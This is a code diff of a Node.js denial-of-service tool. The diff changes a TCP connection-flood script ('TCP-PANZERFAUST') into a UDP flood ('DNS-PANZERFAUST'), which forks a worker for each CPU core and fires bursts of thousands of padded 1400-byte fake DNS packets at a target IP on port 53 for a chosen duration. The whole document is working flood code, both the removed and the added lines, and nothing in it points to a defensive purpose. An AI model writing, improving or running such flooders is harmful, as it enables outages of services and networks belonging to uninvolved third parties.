@@ -1,41 +1,68 @@
-const net = require('net');
+const dgram = require('dgram');
 const cluster = require('cluster');
 const os = require('os');
 
 const target = process.argv[2];
-const port = parseInt(process.argv[3]) || 80;
-const duration = parseInt(process.argv[4]);
+const duration = parseInt(process.argv[3]);
+const port = 53;
 
 if (!target || isNaN(duration)) {
-  console.log('Usage: node tcp-min-pps.js <target_ip> <port> <duration_seconds>');
+  console.log('Usage: node dns-powerful-flood.js <target_ip> <duration_seconds>');
   process.exit(1);
 }
 
-const endTime = Date.now() + duration * 1000;
 const cpuCount = os.cpus().length;
-const socketsPerWorker = 1000; // Push concurrency high to get max PPS
+const endTime = Date.now() + duration * 1000;
+const payloadSize = 1400; // Large UDP packet close to MTU for max bandwidth
 
-function formatNumber(n) {
-  const units = ['', 'K', 'M', 'B', 'T'];
-  let i = 0;
-  while (n >= 1000 && i < units.length - 1) {
-    n /= 1000;
-    i++;
+// Build a fake DNS query header + random payload to fill size
+function buildDnsPayload() {
+  const buf = Buffer.alloc(payloadSize);
+
+  // DNS header (12 bytes)
+  buf.writeUInt16BE(Math.floor(Math.random() * 0xffff), 0); // Transaction ID random
+  buf.writeUInt16BE(0x0100, 2); // Standard query with recursion
+  buf.writeUInt16BE(1, 4); // Questions = 1
+  buf.writeUInt16BE(0, 6); // Answer RRs = 0
+  buf.writeUInt16BE(0, 8); // Authority RRs = 0
+  buf.writeUInt16BE(0, 10); // Additional RRs = 0
+
+  // Query name: "example.com" in DNS format, padded to fill space
+  const domain = 'example.com';
+  let offset = 12;
+  domain.split('.').forEach(label => {
+    buf.writeUInt8(label.length, offset++);
+    for (let i = 0; i < label.length; i++) {
+      buf.writeUInt8(label.charCodeAt(i), offset++);
+    }
+  });
+  buf.writeUInt8(0, offset++); // Terminate name
+
+  // Query type A (1)
+  buf.writeUInt16BE(1, offset);
+  offset += 2;
+  // Query class IN (1)
+  buf.writeUInt16BE(1, offset);
+
+  // Fill rest with random bytes for max payload size
+  for (let i = offset + 2; i < payloadSize; i++) {
+    buf[i] = Math.floor(Math.random() * 256);
   }
-  return `${n.toFixed(2)}${units[i]}`;
+
+  return buf;
 }
 
 if (cluster.isMaster) {
-  let totalPackets = 0;
-  let maxPPS = 0;
+  let totalSent = 0;
+  let totalBytes = 0;
 
   console.clear();
-  console.log('TCP-PANZERFAUST [MAX PPS MIN PAYLOAD]');
+  console.log('DNS-PANZERFAUST [POWERFUL UDP FLOOD]');
   console.log('--------------------------------------');
-  console.log(`Target:         ${target}:${port}`);
-  console.log(`Duration:       ${duration}s`);
-  console.log(`Cores:          ${cpuCount}`);
-  console.log(`Sockets/Core:   ${socketsPerWorker}`);
+  console.log(`Target:          ${target}:${port}`);
+  console.log(`Duration:        ${duration}s`);
+  console.log(`Payload Size:    ${payloadSize} bytes`);
+  console.log(`CPU Cores:       ${cpuCount}`);
   console.log('Launching...\n');
 
   for (let i = 0; i < cpuCount; i++) cluster.fork();
@@ -43,22 +70,41 @@ if (cluster.isMaster) {
   for (const id in cluster.workers) {
     cluster.workers[id].on('message', (msg) => {
       if (msg.type === 'stats') {
-        totalPackets += msg.pps;
-        if (msg.pps > maxPPS) maxPPS = msg.pps;
+        totalSent += msg.sent;
+        totalBytes += msg.bytes;
       }
     });
   }
 
+  function formatNumber(n) {
+    const units = ['', 'K', 'M', 'B', 'T'];
+    let i = 0;
+    while (n >= 1000 && i < units.length - 1) {
+      n /= 1000;
+      i++;
+    }
+    return `${n.toFixed(2)}${units[i]}`;
+  }
+
+  function formatBytes(bytes) {
+    const units = ['B', 'KB', 'MB', 'GB', 'TB', 'PB'];
+    let i = 0;
+    while (bytes >= 1024 && i < units.length - 1) {
+      bytes /= 1024;
+      i++;
+    }
+    return `${bytes.toFixed(2)} ${units[i]}`;
+  }
+
   setInterval(() => {
     console.clear();
-    console.log('TCP-PANZERFAUST [MAX PPS MIN PAYLOAD]');
+    console.log('DNS-PANZERFAUST [POWERFUL UDP FLOOD]');
     console.log('--------------------------------------');
-    console.log(`Total Packets Sent:  ${formatNumber(totalPackets)}`);
-    console.log(`Max PPS:             ${formatNumber(maxPPS)}`);
+    console.log(`Total Packets Sent:  ${formatNumber(totalSent)}`);
+    console.log(`Data Sent:           ${formatBytes(totalBytes)}`);
     console.log(`Target:              ${target}:${port}`);
-    console.log(`Payload:             0 bytes (connect+close)`);
+    console.log(`Payload Size:        ${payloadSize} bytes`);
     console.log('--------------------------------------');
-    maxPPS = 0;
   }, 2000);
 
   setTimeout(() => {
@@ -68,31 +114,29 @@ if (cluster.isMaster) {
   }, duration * 1000);
 
 } else {
-  let pps = 0;
+  const socket = dgram.createSocket('udp4');
+  const payload = buildDnsPayload();
+  let sent = 0;
 
   function spam() {
-    function connectOnce() {
+    function sendLoop() {
       if (Date.now() > endTime) return;
 
-      const socket = net.createConnection({ host: target, port: port }, () => {
-        socket.setNoDelay(true);
-        pps++;
-        socket.destroy(); // Immediately close connection (fires FIN)
-      });
-
-      socket.on('error', () => {});
+      // send bursts for max bandwidth & PPS
+      for (let i = 0; i < 4000; i++) {
+        socket.send(payload, 0, payload.length, port, target, (err) => {
+          if (!err) sent++;
+        });
+      }
+      setImmediate(sendLoop);
     }
-
-    // Use intervals to flood connection attempts aggressively
-    for (let i = 0; i < socketsPerWorker; i++) {
-      setInterval(connectOnce, 0); // "0" means ASAP in libuv, max concurrency
-    }
+    sendLoop();
   }
 
-  spam();
-
   setInterval(() => {
-    process.send({ type: 'stats', pps });
-    pps = 0;
+    process.send({ type: 'stats', sent, bytes: sent * payloadSize });
+    sent = 0;
   }, 1000);
+
+  spam();
 }
